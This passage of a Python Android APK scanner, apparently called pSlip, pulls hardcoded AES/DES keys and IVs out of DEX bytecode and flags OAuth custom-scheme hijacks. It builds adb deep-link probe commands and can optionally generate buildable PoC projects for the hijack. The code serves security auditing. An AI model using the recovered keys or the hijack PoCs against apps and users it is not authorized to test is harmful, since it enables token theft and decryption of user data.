                mo = re.search(r'"(.*)"\s*$', out_s, re.S)
                if rgs and mo:
                    reg[rgs[0]] = ('str', mo.group(1))
                pending = None
            elif nm in INTC:
                mo = re.search(r'(-?\d+)\s*$', out_s)
                if rgs and mo:
                    reg[rgs[0]] = ('int', int(mo.group(1)))
                pending = None
            elif nm.startswith('filled-new-array'):
                try:
                    bs = bytes((reg[r][1] & 0xff) for r in rgs
                               if reg.get(r, ('', 0))[0] == 'int')
                    pending = ('kb', bs, 'filled-new-array literal') \
                        if (bs and len(bs) == len(rgs)) else None
                except Exception:
                    pending = None
            elif nm.startswith('move-result'):
                if rgs and pending is not None:
                    reg[rgs[0]] = pending
                pending = None
            elif nm.startswith('invoke'):
                pending = None
                if not isinstance(ref, str):
                    continue
                if 'getBytes' in ref and rgs:
                    v = reg.get(rgs[0])
                    if v and v[0] in ('str', 'kb'):
                        raw = v[1] if v[0] == 'kb' else v[1].encode('latin1', 'ignore')
                        pending = ('kb', raw, 'String.getBytes()')
                elif (SKS + '-><init>') in ref and len(rgs) >= 2:
                    algo = reg.get(rgs[-1])
                    algo = algo[1] if (algo and algo[0] == 'str') else None
                    findings.append(('KEY', reg.get(rgs[1]), algo))
                elif (IVS + '-><init>') in ref and len(rgs) >= 2:
                    findings.append(('IV', reg.get(rgs[1]), None))
                elif (CIP + '->getInstance') in ref and rgs:
                    t = reg.get(rgs[0])
                    if t and t[0] == 'str':
                        transform[0] = t[1]
        return findings, transform[0]

    def _dotted(cls_desc):
        s = cls_desc
        if s.startswith('L') and s.endswith(';'):
            s = s[1:-1]
        return s.replace('/', '.')

    def _emit(kind, raw, algo, transform, cls_desc, meth, via):
        L = len(raw)
        printable = bool(raw) and all(32 <= b < 127 for b in raw)
        shown = raw.decode('latin1') if printable else raw.hex()
        hexval = raw.hex()
        if kind == 'KEY':
            if (algo and 'AES' in algo) or L in (16, 24, 32):
                if L not in (16, 24, 32):
                    return None
                issue = 'Hardcoded AES Key'
                ksz = {16: 'AES-128', 24: 'AES-192', 32: 'AES-256'}.get(L, '')
                label = "Hardcoded AES key (" + str(L) + " bytes" + \
                        ((", " + ksz) if ksz else "") + ")"
            elif (algo and 'DES' in algo) or L in (8, 24):
                if L not in (8, 24):
                    return None
                issue = 'Hardcoded DES Key'
                label = "Hardcoded DES/3DES key (" + str(L) + " bytes)"
            else:
                return None
            sink_cls = 'SecretKeySpec'
        else:
            if L not in (8, 16):
                return None
            issue = 'Hardcoded IV'
            label = "Hardcoded IV (" + str(L) + " bytes)"
            sink_cls = 'IvParameterSpec'
        dotted = _dotted(cls_desc)
        details = (
            label + " recovered from DEX bytecode. "
            "value=" + repr(shown) + " (hex " + hexval + "). "
            "algorithm=" + (algo or '?') + "; cipher=" + (transform or 'n/a') + ". "
            "provenance: const " + repr(shown) + " -> " + via + " -> "
            + sink_cls + ".<init>. sink=" + dotted + "->" + meth
        )
        return {
            'package_name': package_name,
            'Component': package_name + "/" + dotted + "->" + meth,
            'Issue Type': issue,
            'Details': details,
            'ADB Command': 'N/A',
        }

    dedup = set()
    try:
        apk = APK(apk_file)
        dex_blobs = list(apk.get_all_dex())
    except Exception:
        return out
    for _blob in dex_blobs:
        try:
            dex = DEX(_blob)
        except Exception:
            continue
        # Skip whole DEX files that never reference the crypto types. The type
        # descriptors live in the string pool, so this membership test lets us
        # skip the huge non-crypto dexes of large apps without decoding a single
        # method. This is what keeps giant multi-dex APKs (Audible, Booking, ...)
        # under the timeout: we never build a cross-reference graph and we never
        # touch a dex that has no SecretKeySpec/IvParameterSpec in it.
        try:
            pool = set(dex.get_strings())
        except Exception:
            pool = set()
        if (SKS not in pool) and (IVS not in pool):
            continue
        try:
            classes = dex.get_classes()
        except Exception:
            continue
        for _c in classes:
            try:
                methods = _c.get_methods()
            except Exception:
                continue
            for em in methods:
                try:
                    if em.get_code() is None:
                        continue
                    fnd, transform = _analyze(em)
                except Exception:
                    continue
                if not fnd:
                    continue
                try:
                    cls_desc = em.get_class_name()
                    meth = em.get_name()
                except Exception:
                    continue
                for kind, val, algo in fnd:
                    if not val or val[0] != 'kb':
                        continue
                    raw = val[1]
                    via = val[2] if len(val) > 2 else 'literal'
                    d = _emit(kind, raw, algo, transform, cls_desc, meth, via)
                    if d is None:
                        continue
                    sig = (d['Issue Type'], raw, d['Component'])
                    if sig in dedup:
                        continue
                    dedup.add(sig)
                    out.append(d)
    return out


def _oauth_probe_cmd(scheme, host, path):
    """Representative deep-link probe that demonstrates the activity is
    reachable from the browser via the custom scheme. Not a full PoC - the
    buildable PoC project (when -oauth-poc is set) is the real artifact."""
    if not scheme or scheme in ('http', 'https'):
        return 'N/A'
    uri = scheme + '://' + (host or '')
    if path:
        uri += path
    return 'adb shell am start -W -a android.intent.action.VIEW -d "' + uri + '"'


def run_oauth_scan(apk_path, package_name=None, gen_poc=False, poc_root=None):
    """
    Baked-in OAuth scheme-hijack scan.

    Detection ALWAYS runs. Buildable Android PoC projects are generated only
    when gen_poc is True. Returns a list of pSlip vuln dicts. Never raises -
    one malformed APK must not take down a worker during a multi-thousand run.
    """
    out = []
    try:
        pkg, providers, generics, app_schemes = scan_apk_for_providers(apk_path)
    except Exception:
        return out

    pkg = package_name or pkg or 'unknown'

    # Only spin up a PoC dir if there is something worth building a PoC for.
    # Only providers produce a PoC project (the passive PoC was removed), so only
    # create a PoC dir when there is something to build - avoids empty dirs.
    poc_dir = None
    if gen_poc and providers:
        try:
            safe = re.sub(r'[^a-zA-Z0-9._]', '_', pkg)
            poc_dir = os.path.join(poc_root or 'pslip_oauth_pocs', safe)
            os.makedirs(poc_dir, exist_ok=True)
        except Exception:
            poc_dir = None

    # ---- TIER 1: active-flow providers (leaked client_id) ----
    for p in providers:
        tier = (p.get('confidence') or 'MEDIUM').upper()
        sev = _OAUTH_TIER_TO_SEV.get(tier, 'Medium')
        scheme = p.get('scheme', '')
        host = p.get('redirect_host', '')
        path = p.get('redirect_path', '')
        pre = p.get('preconditions') or []
        redirect = (host + path) if host else (scheme + ':/')
        # Client type / exchange recipe (per "The Wrong Dropdown"). Both public
        # and confidential clients reach tokens; only the /token parameters differ.
        ctype = p.get('client_type')
        if ctype and p.get('client_secret_present'):
            sval = p.get('client_secret_value')
            recipe = ("the code->token exchange ALSO requires the client_secret "
                      "shipped in the APK")
            recipe += (" (recovered: " + _redact_secret(sval) + ")") if sval \
                else " (client_secret string present in DEX; value not isolated)"
            client_clause = (" client type: " + ctype + " - " + recipe
                             + ". Both client types reach tokens; this only changes the "
                             "/token parameters.")
        elif ctype:
            client_clause = (" client type: " + ctype + " - the code->token exchange "
                             "needs client_id + redirect_uri + code_verifier only "
                             "(no client_secret).")
        else:
            client_clause = ""
        det = (
            "OAuth active-flow scheme hijack. provider=" + str(p.get('provider'))
            + " client_id=" + str(p.get('client_id'))
            + " scheme=" + str(scheme) + " redirect=" + str(redirect)
            + (" [cross-platform iOS/desktop client_id]" if p.get('_cross_platform') else "")
            + "." + client_clause
            + " Leaked client_id plus a claimable redirect scheme lets a rogue app drive the "
            "authorize/token exchange. Client-side preconditions are statically proven; the "
            "following are NOT provable from the APK and must be confirmed at runtime before "
            "claiming impact: " + ("; ".join(pre) if pre else "none")
        )
        out.append({
            "package_name": pkg,
            "Component": p.get('activity', '') or 'OAuth redirect activity',
            "Issue Type": "OAuth Scheme Hijack (Active Flow)",
            "Severity": sev,
            "Confidence": tier,
            "Details": det,
            "ADB Command": _oauth_probe_cmd(scheme, host, path),
        })

    # ---- generic findings (webview chain / custom scheme review) ----
    # Per actuator.sh "The Wrong Dropdown": the demonstrable attack is the
    # attacker-initiated ACTIVE flow, which requires an extractable client_id
    # (emitted as Tier 1 above; blog detection conditions 1 + 2). The passive
    # interception finding (no client_id; relies on intercepting the legitimate
    # app's own redirect) is a different, weaker model and is NOT reported.
    for g in generics:
        if g.get('type', '') == 'OAUTH_SCHEME_HIJACK':   # passive scheme hijack
            continue
        sev = _OAUTH_GENERIC_SEV.get((g.get('severity') or 'INFO').upper(), 'Info')
        scheme = g.get('scheme', '')
        host = g.get('redirect_host', '')
        path = g.get('redirect_path', '')
        issue = _OAUTH_TYPE_TO_ISSUE.get(g.get('type', ''), 'OAuth Custom Scheme (Review)')
        det = (g.get('detail', '') or issue) + " [scheme=" + (scheme or '-') \
            + " host=" + (host or '-') + " path=" + (path or '-') + "]"
        out.append({
            "package_name": pkg,
            "Component": g.get('activity', '') or 'N/A',
            "Issue Type": issue,
            "Severity": sev,
            "Confidence": "",
            "Details": det,
            "ADB Command": _oauth_probe_cmd(scheme, host, path),
        })

    # ---- PoC project generation (optional) ----
    # Only the active-flow attack is reported, so only its PoC is generated.
    if poc_dir:
        built = []
        try:
            if providers:
                ppath = generate_active_poc(pkg, providers, app_schemes, poc_dir)
                built.append(ppath)
                for p in providers:
                    rp = p.get('redirect_path', '')
                    if p.get('redirect_host') and rp and len(rp) > 1:
                        generate_prefix_variation_poc(
                            pkg, p['scheme'], poc_dir,
                            redirect_host=p['redirect_host'], redirect_path=rp)
                        break
        except Exception:
            pass
        if built:
            note = "  PoC project(s): " + ", ".join(built) + " (build: gradlew assembleDebug)."
            for v in out:
                v["Details"] += note

    return out

def main():
    global check_aes
    start_time = datetime.now()

    list_permissions_flag = False
    check_js = False
    check_call = False
    collect_permission_vulns = False
    check_aes = False
    gen_oauth_poc = False
    oauth_poc_dir = "pslip_oauth_pocs"
    html_output = None
    json_output = None
    aes_timeout_minutes = 5
    # ------------------------------------------------------------------

    # Must have at least APK argument
    if len(sys.argv) < 2:
        print_help()
        sys.exit(1)

    argument = sys.argv[1]
    if argument in ("-h", "--help"):
        print_help()
        sys.exit(0)

    # ------------------------------------------------------------------
    # Unified scanning model: only -all and -allsafe matter
    # ------------------------------------------------------------------

    # Default mode → full scan
    effective_mode = "all"

    if "-allsafe" in sys.argv:
        effective_mode = "allsafe"
    elif "-all" in sys.argv:
        effective_mode = "all"

    # Apply unified mode
    if effective_mode == "all":
        check_js = True
        check_call = True
        collect_permission_vulns = True
        list_permissions_flag = True
        check_aes = True

    elif effective_mode == "allsafe":
        check_js = True
        check_call = True
        collect_permission_vulns = True
        list_permissions_flag = True
        check_aes = False

    # ------------------------------------------------------------------
    # Output flags (-html, -json, -aes-timeout)
    # ------------------------------------------------------------------
    options = sys.argv[2:]
    skip_next = False

    for i, option in enumerate(options):

        if skip_next:
            skip_next = False
            continue

        if option == "-html":
            if i + 1 < len(options):
                html_output = options[i + 1]
                skip_next = True
                continue
            else:
                print(f"{RED}Error: -html requires a filename.{RESET}")
                sys.exit(1)

        elif option == "-json":
            if i + 1 < len(options):
                json_output = options[i + 1]
                skip_next = True
                continue
            else:
                print(f"{RED}Error: -json requires a filename.{RESET}")
                sys.exit(1)

        elif option == "-aes-timeout":
            if i + 1 < len(options):
                try:
                    aes_timeout_minutes = int(options[i + 1])
                except ValueError:
                    print(f"{RED}Error: -aes-timeout requires minutes as an integer.{RESET}")
                    sys.exit(1)
                skip_next = True
                continue
            else:
                print(f"{RED}Error: -aes-timeout requires a value.{RESET}")
                sys.exit(1)

        elif option == "-aes-deep":
            # Opt into the jadx/apktool source-decompile AES pass instead of the
            # default androguard DEX bytecode scan. Slower (full decompile) but
            # resolves keys the linear bytecode model does not (cross-branch
            # assembly, static-field loads). Needs jadx or apktool present.
            os.environ['PSLIP_AES_DEEP'] = '1'
            continue

        elif option == "-oauth-poc":
            # Optional flag: generate buildable OAuth PoC projects.
            # OAuth DETECTION is always-on; this only enables PoC output.
            gen_oauth_poc = True
            continue

        elif option == "-oauth-poc-dir":
            if i + 1 < len(options):
                oauth_poc_dir = options[i + 1]
                gen_oauth_poc = True
                skip_next = True
                continue
            else:
                print(f"{RED}Error: -oauth-poc-dir requires a directory path.{RESET}")
                sys.exit(1)

        elif option in ("-jadx", "-apktool"):
            # Point pSlip at a jadx/apktool that is not on PATH. Accepts the CLI
            # launcher, a directory to search, or the GUI build (we find the CLI
            # next to it). Sets the same override the PSLIP_JADX/PSLIP_APKTOOL env
            # vars use; read at tool-use time and inherited by any worker process.
            if i + 1 < len(options):
                os.environ['PSLIP_JADX' if option == "-jadx" else 'PSLIP_APKTOOL'] = options[i + 1]
                skip_next = True
                continue
            else:
                print(f"{RED}Error: {option} requires a path.{RESET}")
                sys.exit(1)

        

    # ------------------------------------------------------------------
    # Locate APKs (expands .xapk / .apks / .apkm containers)
    # ------------------------------------------------------------------
    _sweep_stale_temp()        # reclaim leaked extraction dirs from prior crashed runs
    _container_root = [None]   # holder; set if any container is expanded
    apk_paths = gather_apk_inputs(argument, _container_root)
    container_root = _container_root[0]
    if container_root:
        # Crash-safe cleanup: the end-of-run _rmtree is skipped if anything
        # between here and there raises (a crashed worker, a disk-full write).
        # atexit runs on normal interpreter shutdown including after an
        # unhandled exception, so the extraction dir is removed either way and
        # never leaks gigabytes of extracted APKs into %TEMP%.
        import atexit
        atexit.register(_rmtree, container_root)
    if apk_paths is None:
        print(f"{RED}Error: Invalid APK, container (.xapk/.apks/.apkm), or directory.{RESET}")
        print_help()
        sys.exit(1)

    if not apk_paths:
        if container_root:
            _rmtree(container_root)
        print(f"{RED}No APK files found.{RESET}")
        sys.exit(1)

    # ------------------------------------------------------------------
    # MANIFEST SCANNING
    # ------------------------------------------------------------------
    print(BANNER)
    _print_environment()
    pool_args = [
        (apk_file, list_permissions_flag, check_js, check_call,
         collect_permission_vulns, gen_oauth_poc, oauth_poc_dir)
        for apk_file in apk_paths
    ]

    pool_size = multiprocessing.cpu_count()
    print(f"{BOLD}Starting manifest analysis with {pool_size} processes...{RESET}\n")

    all_vulnerabilities = []
    all_permissions_dict = {}
    package_names_for_apks = {}

    with Pool(pool_size) as pool:
        results_list = list(
            tqdm(pool.imap_unordered(analyze_apk, pool_args),
                 total=len(pool_args),
                 desc="Processing APKs")
        )

    for result in results_list:
        apk_file, vulns, perms, pkg_name = result
        if vulns:
            all_vulnerabilities.extend(vulns)
        if perms and list_permissions_flag:
            all_permissions_dict[apk_file] = perms
        if pkg_name:
            package_names_for_apks[apk_file] = pkg_name

    # ------------------------------------------------------------------
    # AES SCANNING 
    # ------------------------------------------------------------------
    if check_aes:
        print(f"\n{BOLD}Starting AES key extraction...{RESET}\n")

        seen_aes = set()
        valid_apks = [a for a in apk_paths if is_valid_apk(a)]
        timeout_seconds = max(0, aes_timeout_minutes) * 60

        # Concurrency. The decompile is the bottleneck and each jadx run is both
        # CPU- and RAM-heavy, so we do NOT reuse the manifest pass's full pool
        # Concurrency. Two regimes:
        #  - default (androguard DEX scan): each analysis is ~single-threaded and
        #    RAM-bound, so running several APKs at once is pure wall-clock win and
        #    needs no jadx thread throttle.
        #  - deep (-aes-deep, jadx): each jadx is itself multi-threaded and heavy,
        #    so we throttle its -j count (PSLIP_JADX_THREADS) to keep
        #    workers * jadx_threads near the core count and avoid oversubscribe.
        # Either way each task runs in its own isolated process with the per-APK
        # hard timeout (run_aes_with_timeout).
        cpu = os.cpu_count() or 2
        _deep = os.environ.get('PSLIP_AES_DEEP') == '1'
        _env_par = os.environ.get('PSLIP_AES_PARALLEL', '')
        if _env_par.isdigit() and int(_env_par) > 0:
            aes_workers = max(1, min(int(_env_par), len(valid_apks) or 1))
        elif _deep:
            aes_workers = max(1, min(len(valid_apks) or 1, max(2, cpu // 4), 8))
        else:
            aes_workers = max(1, min(len(valid_apks) or 1, max(2, cpu // 3), 8))
        if _deep:
            os.environ.setdefault('PSLIP_JADX_THREADS', str(max(1, cpu // max(1, aes_workers))))

        def _pkg_of(a):
            return package_names_for_apks.get(a, os.path.basename(a))

        per_apk_aes = {}
        if aes_workers <= 1 or len(valid_apks) <= 1:
            for apk_file in tqdm(valid_apks, desc="Analyzing for AES keys"):
                try:
                    per_apk_aes[apk_file] = run_aes_with_timeout(
                        apk_file, _pkg_of(apk_file), timeout_seconds) or []
                except Exception:
                    per_apk_aes[apk_file] = []
        else:
            from concurrent.futures import ThreadPoolExecutor, as_completed
            # Threads in the parent only block on their isolated child process,
            # so the GIL is irrelevant here; real work happens in those children.
            with ThreadPoolExecutor(max_workers=aes_workers) as _ex:
                _futs = {
                    _ex.submit(run_aes_with_timeout, a, _pkg_of(a), timeout_seconds): a
                    for a in valid_apks
                }
                for _fut in tqdm(as_completed(_futs), total=len(valid_apks),
                                 desc="Analyzing for AES keys"):
                    a = _futs[_fut]
                    try:
                        per_apk_aes[a] = _fut.result() or []
                    except Exception:
                        per_apk_aes[a] = []

        # Dedupe in deterministic (input) order regardless of completion order.
        # Key on the actual dict fields (the dicts use 'Component'/'Issue Type');
        # include Details so two distinct keys in the same method are both kept.
        for apk_file in valid_apks:
            for v in per_apk_aes.get(apk_file, []):
                sig = (v.get("Component"), v.get("Issue Type"), v.get("Details"))
                if sig not in seen_aes:
                    seen_aes.add(sig)
                    all_vulnerabilities.append(v)

    # ------------------------------------------------------------------
    # OUTPUT REPORTS
    # ------------------------------------------------------------------
    end_time = datetime.now()
    total_time = end_time - start_time

    print(f"\n{BOLD}Vulnerability Summary:{RESET}\n")
    display_vulnerabilities_table(all_vulnerabilities)

    if html_output:
        print(f"\n{BOLD}Generating HTML report...{RESET}")
        generate_html_report(all_vulnerabilities, all_permissions_dict, html_output)

    if list_permissions_flag:
        print(f"\n{BOLD}Permissions Summary:{RESET}\n")
        for apk_file, perms in all_permissions_dict.items():
            print(f"{CYAN}{os.path.basename(apk_file)}:{RESET}")
            for perm in perms:
                print(f"  {perm}")

    print(f"\n{BOLD}Total Execution Time:{RESET} {total_time}")

    if json_output:
        try:
            generate_json_report(all_vulnerabilities,
                                 all_permissions_dict,
                                 json_output)
        except Exception:
            pass

    # remove any APKs extracted from .xapk/.apks/.apkm containers
    if container_root:
        _rmtree(container_root)


# ENTRY POINT
if __name__ == "__main__":
    # Required for PyInstaller/py2exe frozen builds on Windows (spawn start
    # method); a no-op for normal script execution on any platform.
    multiprocessing.freeze_support()
    main()
